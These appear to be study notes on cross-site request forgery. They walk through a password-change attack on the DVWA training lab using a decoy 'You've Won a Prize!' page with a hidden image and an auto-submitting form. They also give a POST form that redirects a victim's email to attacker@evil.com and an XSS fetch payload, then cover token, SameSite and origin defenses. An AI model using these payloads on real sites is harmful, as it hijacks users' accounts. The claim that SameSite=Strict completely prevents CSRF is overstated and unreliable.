# Cross-Site Request Forgery (CSRF) Notes — Task 3

## What is CSRF?
CSRF (Cross-Site Request Forgery) tricks an authenticated user's browser into sending an unwanted request to a web application. The server sees a valid session and executes the request, not knowing it wasn't initiated by the user.

**Key condition:** The victim must be logged in to the target site when they visit the attacker's page.

---

## 1. How CSRF Works

```
1. Victim logs into bank.com → session cookie stored in browser
2. Victim visits attacker.com (malicious page)
3. Attacker's page sends request to bank.com/transfer
4. Browser automatically includes bank.com session cookie
5. Bank executes the transfer — thinks it's a legitimate request
```

---

## 2. CSRF Attack on DVWA — Change Password

### Target
`http://127.0.0.1/dvwa/vulnerabilities/csrf/`
Security Level: **Low**

### Step 1 — Understand the Password Change Request
Log in to DVWA, go to CSRF module, change password, intercept with Burp Suite.

Request looks like:
```
GET /dvwa/vulnerabilities/csrf/?password_new=newpass&password_conf=newpass&Change=Change HTTP/1.1
Host: 127.0.0.1
Cookie: PHPSESSID=xxx; security=low
```

### Step 2 — Craft the CSRF Attack Page
Create `csrf_attack.html`:

```html
<!DOCTYPE html>
<html>
<head>
    <title>You've Won a Prize!</title>
</head>
<body>
    <h1>Congratulations! Claim your prize below.</h1>

    <!-- Hidden CSRF attack — loads silently -->
    <img src="http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" 
         width="0" height="0" style="display:none">

    <!-- Or use a form that auto-submits -->
    <form id="csrfForm" action="http://127.0.0.1/dvwa/vulnerabilities/csrf/" method="GET">
        <input type="hidden" name="password_new" value="hacked">
        <input type="hidden" name="password_conf" value="hacked">
        <input type="hidden" name="Change" value="Change">
    </form>
    <script>
        document.getElementById('csrfForm').submit();
    </script>
</body>
</html>
```

### Step 3 — Deliver the Attack
- Host the page: `python3 -m http.server 9090`
- Victim (already logged into DVWA) visits: `http://127.0.0.1:9090/csrf_attack.html`
- Their password is silently changed to `hacked`

### Step 4 — Verify
- Try logging into DVWA with `admin:hacked` → success confirms attack worked

---

## 3. CSRF with POST Request
```html
<!DOCTYPE html>
<html>
<body onload="document.csrf.submit()">
    <form name="csrf" action="http://target.com/change_email" method="POST">
        <input type="hidden" name="email" value="attacker@evil.com">
        <input type="hidden" name="confirm_email" value="attacker@evil.com">
    </form>
</body>
</html>
```

---

## 4. CSRF Using XSS (Stored XSS + CSRF)
If stored XSS exists, CSRF can be delivered without a separate page:
```javascript
// Stored XSS payload that also performs CSRF
fetch('http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=pwned&password_conf=pwned&Change=Change', {
    credentials: 'include'
});
```

---

## 5. Prevention — CSRF Tokens

### How CSRF Tokens Work
1. Server generates a unique, unpredictable token per session/request
2. Token is embedded in every form as a hidden field
3. Server validates token on every state-changing request
4. Attacker cannot forge the token (they can't read the victim's page due to SOP)

### Implementation in PHP
```php
// Generate token and store in session
session_start();
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
$token = $_SESSION['csrf_token'];
```

```html
<!-- Embed token in form -->
<form method="POST" action="/change_password">
    <input type="hidden" name="csrf_token" value="<?= htmlspecialchars($token) ?>">
    <input type="password" name="password_new" placeholder="New Password">
    <input type="submit" value="Change Password">
</form>
```

```php
// Validate token on form submission
if (!isset($_POST['csrf_token']) || 
    !hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
    die("CSRF validation failed");
}
// Process the request safely
```

### Why This Works
- The attacker's page cannot read the CSRF token (Same-Origin Policy blocks it)
- Without the token, the forged request is rejected by the server

---

## 6. Additional CSRF Defenses

### SameSite Cookie Attribute
Prevents cookies from being sent on cross-origin requests:
```php
// Set SameSite cookie
setcookie('session', $value, [
    'samesite' => 'Strict',   // Never send cross-site
    'secure'   => true,
    'httponly' => true,
]);
```

| SameSite Value | Behavior |
|----------------|---------|
| `Strict` | Cookie never sent on cross-site requests |
| `Lax` | Sent on top-level navigation (GET) only |
| `None` | Always sent (requires Secure flag) |

### Referer / Origin Header Validation
```php
// Check request origin
$allowed_origins = ['https://yourdomain.com'];
$origin = $_SERVER['HTTP_ORIGIN'] ?? '';

if (!in_array($origin, $allowed_origins)) {
    die("Unauthorized origin");
}
```

### Double Submit Cookie Pattern
```javascript
// Client sends token as both cookie and request parameter
// Server verifies they match
```

### Custom Request Headers
```javascript
// AJAX requests with custom header (cross-origin requests can't set custom headers)
fetch('/api/change-password', {
    method: 'POST',
    headers: {
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({ password: newPassword })
});
```

---

## 7. CSRF vs XSS

| Feature | CSRF | XSS |
|---------|------|-----|
| Attack target | Server (uses victim's session) | Client (injects scripts) |
| Requires login | Yes | No |
| Bypassed by | CSRF tokens, SameSite cookies | Output encoding, CSP |
| Impact | Unauthorized actions | Data theft, defacement |
| Origin | External site | Same site (injected) |

---

## Key Takeaways
- CSRF exploits the browser's automatic cookie-sending behavior
- Any state-changing action (password change, fund transfer, settings) is at risk
- CSRF tokens are the primary and most effective defense
- SameSite=Strict cookies completely prevent CSRF in modern browsers
- CSRF + Stored XSS = very powerful combined attack
- GET requests should NEVER perform state-changing operations
